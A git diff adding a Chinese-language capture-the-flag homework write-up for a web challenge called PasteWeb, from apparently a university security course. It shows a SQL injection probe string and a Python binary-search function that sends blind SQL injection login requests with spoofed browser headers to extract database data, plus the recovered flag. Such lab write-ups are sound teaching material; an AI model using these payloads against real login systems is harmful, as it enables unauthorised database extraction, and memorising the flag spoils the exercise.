@@ -49,6 +49,31 @@
     > ![web-lab04-list-class-subclasses-system-curl](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system-curl.png)
     > ![web-lab04-list-class-subclasses-system-curl-flag](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/web-lab04-list-class-subclasses-system-curl-flag.png)
 
+## PasteWeb (Flag 1) - HW
+* 這題打開就是一個登入頁面，這邊想看看 source code 發現沒東西可以看，因此直接手動輸入互動一下，可以發現 error message 有兩種，分別是 `Login Failed` 跟 `Bad Hacker!`，觸發情境分別是一般輸入跟 `admin' union select NULL, NULL -- #` 或者其他 sql payload，因此這邊猜測當 injection 有成功的時候 (不確定後端回傳資料狀況，但應該是 return data > 1) 的時候，就會觸發 "Bad Hacker!" 字串，但也可以發現這邊的 return message 並沒有涉及到任何輸入的資料回顯，因此開始利用 Blind SQL Injection 來找出資料庫的資料。
+* 這邊我準備了一個 shell 來進行 Binary Search 來查詢資料，我的邏輯如下，首先我需要資料這個 DBMS 底下有哪些 DB，再從這些 DB 中選目標的那個 DB 列出所有的 Tables，並從這些 Tables 中找到所有的欄位，再從所有的欄位中找到所有的資料。
+* 這邊的 BinSearch function 如下，為了讓請求更加像真實的請求，我這邊有準備了 chrome 的 headers 來確保請求穩定性。可以看到這邊利用 `"Login Failed"` 作為錯誤的判斷依據，做 BinSearch。
+    ```python=
+    def BinSearch(target: str, start: int, end: int, step: int, headers: dict, url: str, session: requests.Session()):
+        while start < end:
+            mid = (start + end) // 2
+            data = {
+                "username": f"{target} {mid} -- #",
+                "password": "password",
+                "current_time": str(int(time.time())),
+            }
+            response = session.post(url, headers=headers, data=data)
+            if response.text.find("Login Failed") != -1:
+                end = mid
+            else:
+                start = mid + step
+        return start
+    ```
+* 之後就是依照上面想找的資料邏輯一個一個字元爆破所需要的資料 (包含 flag)，請看 payload.py。最後拿到 flag: `FLAG{B1inD_SqL_IiIiiNj3cT10n}`
+
+## PasteWeb (Flag 2) - HW
+
+## PasteWeb (Flag 3) - HW
 
 
 ---
